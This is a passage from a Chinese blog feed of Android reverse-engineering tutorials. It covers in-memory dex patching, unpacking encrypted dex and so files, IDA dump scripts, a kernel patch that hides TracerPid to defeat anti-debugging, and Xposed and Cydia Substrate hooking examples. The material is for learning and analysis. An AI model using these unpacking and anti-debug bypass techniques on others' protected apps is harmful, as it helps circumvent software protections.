数据。</p><p>遍历 Map：</p><pre><code class="cpp">void *get_module_base(pid_t pid, const char *module_name) {    FILE *fp;    long addr = 0;    char *pch;    char filename[32];    char line[1024];    if (pid &lt; 0) {        snprintf(filename, sizeof(filename), &quot;/proc/self/maps&quot;);    } else {        snprintf(filename, sizeof(filename), &quot;/proc/%d/maps&quot;, pid);    }    fp = fopen(filename, &quot;r&quot;);    if (fp != NULL) {        while (fgets(line, sizeof(line), fp)) {            LOGD(&quot;%s&quot;, line);            if (strstr(line, module_name)) {                pch = strtok(line, &quot;-&quot;);                addr = strtoul(pch, NULL, 16);                break;            }        }        fclose(fp);    }    return (void *) addr;}</code></pre><p>重置 Map 属性：</p><pre><code class="cpp">#include &lt;asm-generic/mman-common.h&gt;#include &lt;sys/mman.h&gt;#include &lt;limits.h&gt;if (mprotect(PAGE_START((int)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {    *(u4 *)(pCode-&gt;insns) = 0x000f2012;    mprotect(PAGE_START((int)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);}</code></pre><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><p>接下来编写 changeMethod2 函数，利用 dalvik 中的一些函数来逐步定位到指定函数：</p><pre><code class="cpp">void changeMethod2(JNIEnv *env, jobject obj) {    u1 *pDex = (u1 *) get_module_base(-1, &quot;/data/dalvik-cache/data@app@com.assassinq.editdexfile&quot;);    if (pDex != NULL) {        LOGD(&quot;Get Module&quot;);        pDex += sizeof(DexOptHeader);        DexFile *pDexFile = dexFileParse(pDex, sizeof(DexHeader), kDexParseContinueOnError);        if (pDexFile == NULL) {            LOGE(&quot;Unable to parse DexFile&quot;);            return;        }        const DexClassDef *pClassDef;        for (int i = 0; i &lt; pDexFile-&gt;pHeader-&gt;classDefsSize; ++i) {            const DexClassDef *pDef = dexGetClassDef(pDexFile, i);            if (!strcmp(dexStringByTypeIdx(pDexFile, pDef-&gt;classIdx),                        &quot;Lcom/assassinq/editdexfile/MainActivity;&quot;)) {                pClassDef = pDef;                break;            }        }        if (pClassDef != NULL) {            LOGD(&quot;Class Found&quot;);            const u1 *pData = dexGetClassData(pDexFile, pClassDef);            if (pData) {                DexClassData *pClassData = dexReadAndVerifyClassData(&amp;pData, NULL);                for (int i = 0; i &lt; pClassData-&gt;header.virtualMethodsSize; ++i) {                    DexMethod *pMethod = &amp;pClassData-&gt;virtualMethods[i];                    const DexMethodId *pMethodId = dexGetMethodId(pDexFile, pMethod-&gt;methodIdx);                    if (!strcmp(dexStringById(pDexFile, pMethodId-&gt;nameIdx), &quot;ret1&quot;)) {                        const DexCode *pCode = dexGetCode(pDexFile, pMethod);                        LOGD(&quot;Method found and try to patch&quot;);                        if (mprotect((void *) PAGE_START((int) (pCode-&gt;insns)), PAGE_SIZE,                                     PROT_READ | PROT_WRITE) == 0) {                            *(u4 *) (pCode-&gt;insns) = 0x000F2012;                            mprotect((void *) PAGE_START((int) (pCode-&gt;insns)), PAGE_SIZE,                                     PROT_READ);                        }                    }                }                free(pClassData);            }        }        dexFileFree(pDexFile);    }}static JNINativeMethod gMethods[] = {        ...        {&quot;changeMethod2&quot;, &quot;()V&quot;,                           (void *) changeMethod2},};...</code></pre><p>在 app 下的 build.gradle 中修改以强制转换指针：</p><pre><code>android {    ...    defaultConfig {        ...        externalNativeBuild {            cmake {                cppFlags &quot;-fpermissive&quot;            }        }    }    ...}</code></pre><p>TODO:</p><h1 id="DVM-脱壳"><a href="#DVM-脱壳" class="headerlink" title="DVM 脱壳"></a>DVM 脱壳</h1><p>目前存在对 apk 中的 classes.dex 进行加密的技术，称为加壳。通过对 dex 文件的加壳，可以达到减少体积，隐藏真实代码的效果。Android 的壳与 PE 文件一样，在程序运行时，先到达壳的入口点，运行解壳代码，然后再到达程序入口点并运行代码。如果要脱壳，就需要在程序解码完毕并到达程序真实入口点中间某个位置，把原始的 dex 代码给 dump 下来，还原到 apk 文件中。</p><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>壳入口：</p><pre><code class="xml">&lt;application android:name=&quot;com.ali.mobisecenhance.SubApplication&quot; /&gt;</code></pre><p>程序入口：</p><pre><code class="xml">&lt;activity android:name=&quot;com.ali.encryption.MainActivity&quot; /&gt;</code></pre><h2 id="assets-分析"><a href="#assets-分析" class="headerlink" title="assets 分析"></a>assets 分析</h2><p>assets 中一般存储着加密过的 dex，以及解密用的 so 等信息，因此先分析 assets 可以有效获取程序解壳思路。</p><h2 id="ProxyApplication-分析"><a href="#ProxyApplication-分析" class="headerlink" title="ProxyApplication 分析"></a>ProxyApplication 分析</h2><h2 id="壳代码分析"><a href="#壳代码分析" class="headerlink" title="壳代码分析"></a>壳代码分析</h2><p>壳代码中 Java 层转 Native 层：</p><pre><code class="java">protected native void attachBaseContext(Context arg1) {} // 还原代码public native void onCreate() {} // 执行原始代码</code></pre><h2 id="so-文件分析"><a href="#so-文件分析" class="headerlink" title="so 文件分析"></a>so 文件分析</h2><p>带压缩的，一般用 libz 中的 uncompress 函数进行解码，可以用该函数进行快速定位。</p><h2 id="IDA-中-dump-数据"><a href="#IDA-中-dump-数据" class="headerlink" title="IDA 中 dump 数据"></a>IDA 中 dump 数据</h2><p>在 Native 层中解密 dex 数据并还原后，替换为原始 Application。IDC Dump 脚本：</p><pre><code class="cpp">static main(void) {    auto fp, begin, end, len, b;    fp = fopen(&quot;dump.data&quot;, &quot;wb&quot;);    begin = 0x544D2008; // 解密后数据在内存中的位置    len = 0x019CF4; // 文件大小    end = begin + len;    for (b = begin; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><h2 id="Dex-加载流程"><a href="#Dex-加载流程" class="headerlink" title="Dex 加载流程"></a>Dex 加载流程</h2><p>vm-&gt;native-&gt;dalvik_systm_DexFile-&gt;openDexFile，读取内存中的 Dex 文件数据，并加载 Dalvik_dalvik_system_DexFile_openDexFile_bytearray。</p><pre><code class="cpp">// 转换存储的dex格式为可执行的dex格式dvmRawDexFileOpenArray(pBytes, length, &amp;pRawDexFile);// 添加到gDvm中addToDexFileTable(pDexOrJar);</code></pre><p>壳实现加载流程：</p><ol><li>内存中解密 dex 函数</li><li>将 dex 存储结构转换为可执行结构</li><li>添加到 gDvm 中（有些壳是自己实现了这个功能，有些是调用了系统的函数）</li><li>抹去 dex 存储结构中的有效数据</li></ol><h2 id="内存-dex-定位"><a href="#内存-dex-定位" class="headerlink" title="内存 dex 定位"></a>内存 dex 定位</h2><p>gDvm.userDexFiles 是存放 dex cookie（dexOfJar 结构）的地方，因此可以通过遍历该数据结构来获得每个 dex 文件的起始地址。</p><p>Dex 重构：通过分析内存中的 dex 存储结构，完成对整个 dex 文件的 dump。</p><p>Dex 转 Odex：优化 vm\analysis\Optimize.cpp-&gt;dvmOptimizeClass</p><p>Dex 校验：vm\analysis\DexVerify.cpp-&gt;dvmVerifyClass</p><p>取消非必要优化与校验：\system\build.prop =&gt; Dalvik.vm.dexopt-flag=v=n,o=n</p><h1 id="ELF-文件简介（ARM-架构下的-ELF）"><a href="#ELF-文件简介（ARM-架构下的-ELF）" class="headerlink" title="ELF 文件简介（ARM 架构下的 ELF）"></a>ELF 文件简介（ARM 架构下的 ELF）</h1><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>ELF 在加载前和加载后的文件格式是完全不同的，给加密提供了方便。</p><p><img src="/pics/Android逆向入门/四/4.png" srcset="/img/loading.gif" alt></p><p>链接执行时，Section Header 中的表将会被映射到 Program Header 中，里面的 ELF Header、Program Header 和 Section header 非常重要，Linker 会根据这三个头信息进行 so 文件加载。</p><p>PS：如何从内存中 dump 下 so 文件？开启 IDA 动态调试，在 Module 窗口中找到对应的 so 文件，根据 so 文件的起始地址和文件大小，使用 IDC 脚本 dump 下来。</p><h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><p>存储 so 文件最为基本的信息，如 so 运行的 CPU 平台、Program Header 数量、Section Header 数量等，重要性等同于 Dex Header。</p><pre><code class="bash">$ readelf -h libxtian.soELF Header:  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00  Class:                             ELF32  Data:                              2&#39;s complement, little endian  Version:                           1 (current)  OS/ABI:                            UNIX - System V  ABI Version:                       0  Type:                              DYN (Shared object file)  Machine:                           ARM  Version:                           0x1  Entry point address:               0x0  Start of program headers:          52 (bytes into file)  Start of section headers:          117240 (bytes into file)  Flags:                             0x5000200, Version5 EABI, soft-float ABI  Size of this header:               52 (bytes)  Size of program headers:           32 (bytes)  Number of program headers:         8  Size of section headers:           40 (bytes)  Number of section headers:         25  Section header string table index: 24</code></pre><h3 id="Section-Header"><a href="#Section-Header" class="headerlink" title="Section Header"></a>Section Header</h3><p>存储 so 的链接用信息，主要是用于给外部程序详细地提供本 so 的信息，比如第几行对应哪个函数、什么名字、对应着源码的什么位置等等。IDA 就是通过读取该头信息进行 so 分析的。</p><pre><code class="bash">$ readelf -S libxtian.soThere are 25 section headers, starting at offset 0x1c9f8:Section Headers:  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al  [ 0]                   NULL            00000000 000000 000000 00      0   0  0  [ 1] .note.gnu.build-i NOTE            00000134 000134 000024 00   A  0   0  4  [ 2] .dynsym           DYNSYM          00000158 000158 000570 10   A  3   1  4  [ 3] .dynstr           STRTAB          000006c8 0006c8 00034e 00   A  0   0  1  [ 4] .hash             HASH            00000a18 000a18 000270 04   A  2   0  4  [ 5] .gnu.version      VERSYM          00000c88 000c88 0000ae 02   A  2   0  2  [ 6] .gnu.version_d    VERDEF          00000d38 000d38 00001c 00   A  3   1  4  [ 7] .gnu.version_r    VERNEED         00000d54 000d54 000020 00   A  3   1  4  [ 8] .rel.dyn          REL             00000d74 000d74 0050f8 08   A  2   0  4  [ 9] .rel.plt          REL             00005e6c 005e6c 0000a0 08  AI  2  10  4  [10] .plt              PROGBITS        00005f0c 005f0c 000104 00  AX  0   0  4  [11] .text             PROGBITS        00006010 006010 013684 00  AX  0   0  4  [12] .ARM.extab        PROGBITS        00019694 019694 0001a4 00   A  0   0  4  [13] .ARM.exidx        ARM_EXIDX       00019838 019838 000250 08  AL 11   0  4  [14] .rodata           PROGBITS        00019a90 019a90 0002d0 00   A  0   0 16  [15] .fini_array       FINI_ARRAY      0001ad64 019d64 000008 00  WA  0   0  4  [16] .init_array       INIT_ARRAY      0001ad6c 019d6c 000004 00  WA  0   0  1  [17] .dynamic          DYNAMIC         0001ad70 019d70 000120 08  WA  3   0  4  [18] .got              PROGBITS        0001ae90 019e90 000170 00  WA  0   0  4  [19] .data             PROGBITS        0001b000 01a000 002870 00  WA  0   0 16  [20] .bss              NOBITS          0001d870 01c870 0001d8 00  WA  0   0  4  [21] .comment          PROGBITS        00000000 01c870 00003d 01  MS  0   0  1  [22] .note.gnu.gold-ve NOTE            00000000 01c8b0 00001c 00      0   0  4  [23] .ARM.attributes   ARM_ATTRIBUTES  00000000 01c8cc 000036 00      0   0  1  [24] .shstrtab         STRTAB          00000000 01c902 0000f6 00      0   0  1Key to Flags:  W (write), A (alloc), X (execute), M (merge), S (strings)  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)  O (extra OS processing required) o (OS specific), p (processor specific)</code></pre><h3 id="Program-Header"><a href="#Program-Header" class="headerlink" title="Program Header"></a>Program Header</h3><p>存储 so 文件运行时需要的信息。该信息会直接被 Linker 所使用，运用于 so 加载。因此这个 Header 的数据是肯定可信的</p><pre><code class="bash">$ readelf -l libxtian.soElf file type is DYN (Shared object file)Entry point 0x0There are 8 program headers, starting at offset 52Program Headers:  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4  LOAD           0x000000 0x00000000 0x00000000 0x19d60 0x19d60 R E 0x1000  LOAD           0x019d64 0x0001ad64 0x0001ad64 0x02b0c 0x02ce4 RW  0x1000  DYNAMIC        0x019d70 0x0001ad70 0x0001ad70 0x00120 0x00120 RW  0x4  NOTE           0x000134 0x00000134 0x00000134 0x00024 0x00024 R   0x4  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0  EXIDX          0x019838 0x00019838 0x00019838 0x00250 0x00250 R   0x4  GNU_RELRO      0x019d64 0x0001ad64 0x0001ad64 0x0029c 0x0029c RW  0x4 Section to Segment mapping:  Segment Sections...   00   01     .note.gnu.build-id .dynsym .dynstr .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.extab .ARM.exidx .rodata   02     .fini_array .init_array .dynamic .got .data .bss   03     .dynamic   04     .note.gnu.build-id   05   06     .ARM.exidx   07     .fini_array .init_array .dynamic .got</code></pre><h2 id="加载-so-的流程"><a href="#加载-so-的流程" class="headerlink" title="加载 so 的流程"></a>加载 so 的流程</h2><p>Android 上的 ELF 文件是通过 Linker（位于 Bionic/Linker）加载到内存中并进行执行的。所以通过研究 Linker 可以清楚地知道 Android 系统到底使用了到了 so 的哪些数据。Linker 启动时会先对自身的函数表数据等进行重定位，然后再对其他 so 文件进行定位。</p><p>Linkere 加载中只会用到 Program Header（甚至直接删除 Section Header 也是可以的）。Program Header 解析：</p><pre><code class="cpp">link.cpp -&gt; soinfo *do_dlopen(const char *name, int flags) // so加载find_library(name);si-&gt;CallConstructors();CallFunction(&quot;DT_INIT&quot;, init_func); // so脱壳点CallArray(&quot;DT_INIT_ARRAY&quot;, init_array, init_array_count, false); // dex脱壳点</code></pre><p>加载 so 的时候，有两种加载方式，一个是直接 load，还有一个是 loadLibrary。无论是哪种方式，都会先获取 ClassLoader，然后再调用相应的方法。当传进来的 loader 不为空，则会调用 findLibrary 方法，然后执行 doLoad 方法，如果 loader 为空，则会执行另一个流程，但是后面也会执行 doLoad 方法。</p><h2 id="ELF-文件变形与保护（阻碍分析）"><a href="#ELF-文件变形与保护（阻碍分析）" class="headerlink" title="ELF 文件变形与保护（阻碍分析）"></a>ELF 文件变形与保护（阻碍分析）</h2><ul><li>Section 段处理：鉴于 Section Header 没有被 Linker 用于加载，所以可以对 Section 段写入无用数据，可以阻碍静态分析软件的分析。</li><li>Program 段处理：Program 段中可以对 DYNAMIC 区段进行混淆，添加重复的数据以及无效的数据。</li></ul><h1 id="so-文件加壳修复"><a href="#so-文件加壳修复" class="headerlink" title="so 文件加壳修复"></a>so 文件加壳修复</h1><pre><code class="bash">Program Headers:  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align  EXIDX          0x02867c 0x0002867c 0x0002867c 0x00568 0x00568 R   0x4  LOAD           0x000000 0x00000000 0x00000000 0x13294 0x13294 R E 0x8000  LOAD           0x018c10 0x00030c10 0x00030c10 0x0052c 0x01548 RW  0x8000  DYNAMIC        0x018c74 0x00030c74 0x00030c74 0x00108 0x00108 RW  0x4  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4  GNU_RELRO      0x018c10 0x00030c10 0x00030c10 0x003f0 0x003f0 R   0x1</code></pre><p>加过壳的标志：<code>FileSiz!=MemSiz</code>，明显存在加载后在内存进行解码的可能。函数地址也在文件之外。</p><p>修复：dump 内存，数据对齐重定位。</p><h1 id="Android-源码定制添加反反调试基址"><a href="#Android-源码定制添加反反调试基址" class="headerlink" title="Android 源码定制添加反反调试基址"></a>Android 源码定制添加反反调试基址</h1><p>反调试一般会检测 proc 下是否有 status/stat 文件。首先修改 kernel 源码中的 <code>fs/proc/base.c</code>。修改 proc_pid_wchan 函数的返回值：</p><pre><code class="cpp">static int proc_pid_wchan(struct task_struct *task, char *buffer){        unsigned long wchan;        char symname[KSYM_NAME_LEN];        wchan = get_wchan(task);        if (lookup_symbol_name(wchan, symname) &lt; 0)                if (!ptrace_may_access(task, PTRACE_MODE_READ))                        return 0;                else                        return sprintf(buffer, &quot;%lu&quot;, wchan);        else {                if (strstr(symname, &quot;trace&quot;)) { // 检测进程中是否有trace这个字符串                        return sprintf(buffer, &quot;%s&quot;, &quot;sys_epoll_wait&quot;); // sys_epoll_wait用来获取文件状态已经就绪的事件                }                return sprintf(buffer, &quot;%s&quot;, symname);        }}</code></pre><p>然后是 <code>fs/proc/array.c</code> 文件，分别修改 tast_state 函数和 task_state_array 变量：</p><pre><code class="cpp">static inline void task_state(struct seq_file *m, struct pid_namespace *ns,                                struct pid *pid, struct task_struct *p){        struct group_info *group_info;        int g;        struct fdtable *fdt = NULL;        const struct cred *cred;        pid_t ppid, tpid;        rcu_read_lock();        ppid = pid_alive(p) ?                task_tgid_nr_ns(rcu_dereference(p-&gt;real_parent), ns) : 0;        tpid = 0;        if (pid_alive(p)) {                struct task_struct *tracer = ptrace_parent(p);                if (tracer)                        tpid = task_pid_nr_ns(tracer, ns);        }        cred = get_task_cred(p);        seq_printf(m,                &quot;State:\t%s\n&quot;                &quot;Tgid:\t%d\n&quot;                &quot;Pid:\t%d\n&quot;                &quot;PPid:\t%d\n&quot;                &quot;TracerPid:\t%d\n&quot;                &quot;Uid:\t%d\t%d\t%d\t%d\n&quot;                &quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,                get_task_state(p),                task_tgid_nr_ns(p, ns),                pid_nr_ns(pid, ns),                ppid, 0, // 把tpid修改为0                cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,                cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);        task_lock(p);        if (p-&gt;files)                fdt = files_fdtable(p-&gt;files);        seq_printf(m,                &quot;FDSize:\t%d\n&quot;                &quot;Groups:\t&quot;,                fdt ? fdt-&gt;max_fds : 0);        rcu_read_unlock();        group_info = cred-&gt;group_info;        task_unlock(p);        for (g = 0; g &lt; min(group_info-&gt;ngroups, NGROUPS_SMALL); g++)                seq_printf(m, &quot;%d &quot;, GROUP_AT(group_info, g));        put_cred(cred);        seq_putc(m, &#39;\n&#39;);}static const char * const task_state_array[] = {        &quot;R (running)&quot;,          /*   0 */        &quot;S (sleeping)&quot;,         /*   1 */        &quot;D (disk sleep)&quot;,       /*   2 */        &quot;S (sleeping)&quot;,         // &quot;T (stopped)&quot;,          /*   4 */        &quot;S (sleeping)&quot;,         // &quot;t (tracing stop)&quot;,     /*   8 */        &quot;Z (zombie)&quot;,           /*  16 */        &quot;X (dead)&quot;,             /*  32 */        &quot;x (dead)&quot;,             /*  64 */        &quot;K (wakekill)&quot;,         /* 128 */        &quot;W (waking)&quot;,           /* 256 */};</code></pre><p>然后可以根据<a href="https://se8s0n.github.io/2019/04/19/%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87TracePID%E5%8F%8D%E8%B0%83%E8%AF%95%E4%BA%8C%E2%80%94%E2%80%94%E4%BB%8E%E6%BA%90%E7%A0%81%E5%85%A5%E6%89%8B/" target="_blank" rel="noopener">这篇文章</a>把 boot.img 重新打包并刷入手机。</p><h1 id="Refereences"><a href="#Refereences" class="headerlink" title="Refereences"></a>Refereences</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://www.jianshu.com/p/f7f0a712ddfe" target="_blank" rel="noopener">https://www.jianshu.com/p/f7f0a712ddfe</a><br><a href="https://source.android.com/devices/tech/dalvik/dex-format.html" target="_blank" rel="noopener">https://source.android.com/devices/tech/dalvik/dex-format.html</a><br><a href="https://www.jianshu.com/p/f7f0a712ddfe" target="_blank" rel="noopener">https://www.jianshu.com/p/f7f0a712ddfe</a><br><a href="http://gnaixx.cc/2016/11/26/20161126dex-file/" target="_blank" rel="noopener">http://gnaixx.cc/2016/11/26/20161126dex-file/</a><br><a href="https://www.cnblogs.com/stars-one/p/8890162.html" target="_blank" rel="noopener">https://www.cnblogs.com/stars-one/p/8890162.html</a><br><a href="http://shxi.me/posts/7b82cd68.html" target="_blank" rel="noopener">http://shxi.me/posts/7b82cd68.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android 加壳和脱壳入门。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（三）</title>
    <link href="blog.b3ale.cn/2020/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2020-02-12T06:06:59.000Z</published>
    <updated>2020-03-20T02:19:06.080Z</updated>
    
    <content type="html"><![CDATA[<p>记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。</p><a id="more"></a><h1 id="JEB-插件扩展"><a href="#JEB-插件扩展" class="headerlink" title="JEB 插件扩展"></a>JEB 插件扩展</h1><h2 id="插件帮助文件"><a href="#插件帮助文件" class="headerlink" title="插件帮助文件"></a>插件帮助文件</h2><pre><code>$JEB/doc/apidoc</code></pre><h2 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h2><p>语言：Java/Python</p><pre><code class="java">import jeb.api.IScript;public class decJebString implemants IScript {    private JebInstance jeb = null;    @Override    public void run(JebInstance jebInstance) {        jeb = jebInstance;        jeb.print(&quot;Hello World!!!&quot;);    }}</code></pre><p>强制反编译结果，相当于 Ctrl+F5：</p><pre><code class="java">import jeb.api.IScript;public class decJebString implemants IScript {    private static String targetSignature = &quot;Lcom/pnfsoftware/jebglobal/decStr;-&gt;decodeString([BII)Ljava/lang/String;&quot;;    private JebInstance jeb = null;    @Override    public void run(JebInstance jebInstance) {        jeb = jebInstance;        Dex dex = jeb.getDex();        List&lt;String&gt; classSignatures = dex.getClassSignatures(true);        int methodCount = dex.getMethodCount();        String methodSig;        for(int i = 0; i &lt; methodCount; i++) {            DexMethod dexMethod = dex.getMethod(i);            int idx = dexMethod.getIndex();            methodSig = dexMethod.getSignature(true);            if(methodSig.equals(targetSignature)) {                List&lt;Integer&gt; methodReferences = dex.getMethodReferences(idx); // 获取交叉引用                for(Integer refIdx : methodReferences) {                    DexMethod refDexMethod = dex.getMethod(refIdx);                    jeb.decompileMethod(refDexMethod.getSignature(true));                    ...                }            }        }        ...    }    ...}</code></pre><h1 id="Android-快速定位关键代码"><a href="#Android-快速定位关键代码" class="headerlink" title="Android 快速定位关键代码"></a>Android 快速定位关键代码</h1><ul><li>字符串、特征字</li><li>关键 API 监控</li><li>Hook 解密函数</li><li>Monitor</li><li>插 Log 信息<ul><li><code>invoke-static {v0}, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V</code></li></ul></li><li>动态调试</li></ul><h1 id="快速-Hook-代码"><a href="#快速-Hook-代码" class="headerlink" title="快速 Hook 代码"></a>快速 Hook 代码</h1><p>对函数进行挂钩，可以影响整个函数的执行。挂钩后，注入的代码可以接管整个函数，修改函数的参数，返回值，甚至整个函数的行为等。</p><h2 id="Cydia-Substrate"><a href="#Cydia-Substrate" class="headerlink" title="Cydia Substrate"></a><a href="http://www.cydiasubstrate.com/" target="_blank" rel="noopener">Cydia Substrate</a></h2><p>只要知道类名就可以 Hook，而且属于系统全局属性，软件基本上不能检测到。</p><h3 id="Hook-Java"><a href="#Hook-Java" class="headerlink" title="Hook Java"></a>Hook Java</h3><ol><li>新建空项目</li><li>导入 lib 文件 substrate-api.jar</li><li>修改 AndroidManifest.xml 文件</li><li>编写入口类</li><li>安装激活插件，重启后可以看到插件效果</li></ol><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>修改 AndroidManifest.xml 文件：</p><pre><code class="xml">&lt;manifest&gt;    &lt;application&gt;        ...        &lt;meta-data android:name=&quot;com.saurik.substrate.main&quot; android:value=&quot;com.assassinq.cydiajavahook.CydiaMain&quot;/&gt;        ...    &lt;/application&gt;    &lt;uses-permission android:name=&quot;cydia.permission.SUBSTRATE&quot;/&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;&gt;&lt;/uses-permission&gt;&lt;/manifest&gt;</code></pre><p>编写入口类</p><pre><code class="java">package com.assassinq.cydiajavahook;import com.saurik.substrate.MS;import java.lang.reflect.Method;public class CydiaMain {    static void initialize() {        MS.hookClassLoad(&quot;android.content.res.Resources&quot;, new MS.ClassLoadHook() {            @Override            public void classLoaded(Class&lt;?&gt; resources) {                Method getColor;                try {                    getColor = resources.getDeclaredMethod(&quot;getColor&quot;, Integer.TYPE);                } catch (Exception e) {                    getColor = null;                }                if (getColor != null) {                    final MS.MethodPointer old = new MS.MethodPointer();                    MS.hookMethod(resources, getColor, new MS.MethodHook() {                        @Override                        public Object invoked(Object res, Object... args) throws Throwable {                            int color = (Integer) old.invoke(res, args);                            return color &amp; ~0xFFFFFF | 0x00AAAA;                        }                    }, old);                }            }        });    }}</code></pre><p>编写完成后，将程序安装到手机上，会弹出 Substrate extentions updated：</p><p><img src="/pics/Android逆向入门/三/1.png" srcset="/img/loading.gif" alt></p><p>点击进入 Cydia Substrate，点击 Restart System (Soft) 来重启系统：</p><p><img src="/pics/Android逆向入门/三/2.png" srcset="/img/loading.gif" alt></p><p>重启后发现系统某些部分的颜色已经被我们 Hook 成了其他颜色：</p><p><img src="/pics/Android逆向入门/三/3.png" srcset="/img/loading.gif" alt></p><p>在设置中打开更加明显：</p><p><img src="/pics/Android逆向入门/三/4.png" srcset="/img/loading.gif" alt></p><h4 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h4><p>Java 可以通过反射方法去获取类以及它的成员。反射相当于提供一些函数，让我们在不知道原始累的定义的情况下，去修改类中相关的成员的属性、值等。</p><p>所有类都是继承自 Object 类的，所以都可以使用 Object 的方法。也可以强制转换为 Object。所有，遇到无法表示出来的对象时，直接用 Object 即可。</p><p>获取对象的类：</p><pre><code class="java">Object obj = &quot;123&quot;;Class clazz = obj.getClass();</code></pre><p>获取类中的方法（使用对应的不是以 s 为后缀的函数可以获取特定的函数或 field）：</p><pre><code class="java">Method[] mPubMethods = clazz.getMethods(); // 获取公有可直接调用的方法Method[] mDeclareMethods = clazz.getDeclareMethods(); // 获取类中声明的所有方法Field[] mPubFields = clazz.getFields(); // 获取public的fieldField[] mDeclareFields = clazz.getDeclaredFields(); // 获取声明的所有field</code></pre><p>方法调用：</p><pre><code class="java">method.invoke(obj, arg)</code></pre><p>域操作：</p><pre><code class="java">field.set(obj, &quot;1&quot;);field.get(obj);</code></pre><p>访问权限设置（域与方法都一样，控制是否可以直接访问，其实就是相当于 public 属性）：</p><pre><code class="java">field.isAccessible();field.setAccessible(true);</code></pre><p>其余的函数，可以获取函数的名称，还有其他种种信息：</p><pre><code class="java">field.getName();field.toString();Class.forName(&quot;android.view.Menu&quot;); // 寻找类，必须是一个classloader下的才能使用</code></pre><h2 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h2><p>Xposed 是在程序启动的时候同时加载的，因此他的 Hook 是区分进程的。对于程序的类和参数可以通过名字来进行 Hook。Xposed 的 Hook 分为函数执行前和执行后两个位置，可以分别进行参数修改和结果修改。如果不想进行调用的话，可以在执行前使用 <code>setResult(NULL)</code> 函数。比起 Cydia 使用范围更加广泛，各种插件都是基于 Xposed 的，并且是开源的。</p><ol><li>新建基础项目</li><li>导入 lib 文件 XposedBridgeApi-54.jar（compileOnly 模式，也就是不参与编译到最终文件中）</li><li>修改 AndroidManifest.xml 文件</li><li>入口类编写</li><li>设置启动入口：在 assets 文件夹中，新建 xposed_init 文件，写入入口类的信息 com.assassinq.xposedjavahook.XposedMain</li><li>安装激活插件，重启后可以看到插件效果</li></ol><p>修改 app 下的 build.gradle 文件，将对应 lib/XposedBridgeApi-54.jar 的操作 implementation 修改成 compileOnly：</p><pre><code class="gradle">...dependencies {    ...    compileOnly files(&#39;lib/XposedBridgeApi-54.jar&#39;)}</code></pre><h3 id="Hook-Java-1"><a href="#Hook-Java-1" class="headerlink" title="Hook Java"></a>Hook Java</h3><p>修改 AndroidManifest.xml 文件：</p><pre><code class="xml">&lt;manifest&gt;    &lt;application&gt;        ...        &lt;meta-data android:name=&quot;xposedmodule&quot; android:value=&quot;true&quot;/&gt;        &lt;meta-data android:name=&quot;xposeddescription&quot; android:value=&quot;Hook getColor&quot;/&gt;        &lt;meta-data android:name=&quot;xposedminversion&quot; android:value=&quot;54&quot;/&gt;    &lt;/application&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;&gt;&lt;/uses-permission&gt;&lt;/manifest&gt;</code></pre><p>入口类编写，新建一个类文件：</p><pre><code class="java">public class XposedMain implements IXposedHookLoadPackage {    @Override    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam param) throws Throwable {//        if (param.packageName.equals(&quot;apk&quot;)) {            try {                findAndHookMethod(&quot;android.content.res.Resources&quot;, param.classLoader, &quot;getColor&quot;, int.class, new myGetColor());//                waitForDebugger();            } catch (Exception e) {                XposedBridge.log(e);            }//        }    }}class myGetColor extends XC_MethodHook {    @Override    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {        Log.d(&quot;DEBUG&quot;, &quot;Before Method Hook&quot;);    }    @Override    protected void afterHookedMethod(MethodHookParam param) throws Throwable {        Log.d(&quot;DEBUG&quot;, &quot;After Method Hook&quot;);        int res = (int) param.getResult();s        res = res &amp; ~0xFFFFFF | 0x00AAAA;        param.setResult(res);    }}</code></pre><p>同样，编写完成后会弹出一个 Xposed module is not activated：</p><p><img 